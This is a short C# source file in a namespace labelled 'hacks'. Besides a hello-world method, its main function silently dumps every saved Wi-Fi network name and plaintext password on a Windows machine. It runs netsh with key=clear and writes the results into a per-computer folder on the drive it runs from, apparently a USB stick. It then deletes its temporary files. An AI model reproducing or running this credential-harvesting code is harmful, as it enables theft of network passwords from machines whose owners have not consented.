using System;
using System.IO;
using System.Linq;
using System.Text;

namespace console_of_all_functions.libraries.hacks
{
    class Hacks
    {
        internal static void HelloWorld()
        {
            Console.WriteLine("Hello World!");
        }

        internal static void Wifi()
        {
            try
            {
                string createWifiFile = "/c netsh wlan show profiles & find \"" + "Todos" + "\">wifiNames.txt";
                System.Diagnostics.Process.Start("CMD.exe", createWifiFile);
                var lines = File.ReadAllLines("wifiNames.txt", Encoding.UTF8);
                string device = Directory.GetCurrentDirectory().Substring(0, 2);
                string computer = Environment.MachineName;
                var output = File.CreateText(device + "\\Data\\" + computer + "\\wifiPasswords.txt");

                foreach (var line in lines)
                {
                    string wifiName = line.Split(':')[1];
                    string getWifiPassword = "/c netsh wlan show profile " + wifiName + " key=clear>wifiInfo.txt";
                    System.Diagnostics.Process.Start("CMD.exe", getWifiPassword);
                    var info = File.ReadAllLines("wifiInfo.txt", Encoding.UTF8).ToList();
                    string fileWrite = "Wifi name: " + wifiName + "  Password: " + info.Where(x => x.Contains("Conteúdo da Chave")).First().Split(':')[1];
                    output.WriteLine(fileWrite);
                }

                output.Close();
                File.Delete(Directory.GetCurrentDirectory() + "\\wifiNames.txt");
                File.Delete(Directory.GetCurrentDirectory() + "\\wifiInfo.txt");
                Console.WriteLine("Success");
            }
            catch
            {
                Console.WriteLine("Failure");
                throw;
            }
        }
    }
}